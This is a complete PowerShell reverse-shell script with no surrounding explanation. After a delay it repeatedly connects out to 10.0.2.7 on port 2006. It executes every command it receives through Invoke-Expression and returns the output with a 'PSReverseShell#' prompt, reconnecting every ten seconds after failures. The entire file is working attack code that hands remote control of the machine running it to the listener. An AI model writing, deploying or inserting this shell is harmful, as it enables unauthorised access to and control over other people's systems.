Start-Sleep -Seconds 60

$RHost = "10.0.2.7"
$RPort = 2006
$Interval = 10

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($RHost,$RPort)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | % {0}

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            $sendback = (Invoke-Expression $data 2>&1 | Out-String)
            $sendback2 = $sendback + "PSReverseShell# "
            $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    }
    catch {
        Start-Sleep -Seconds $Interval
    }
}
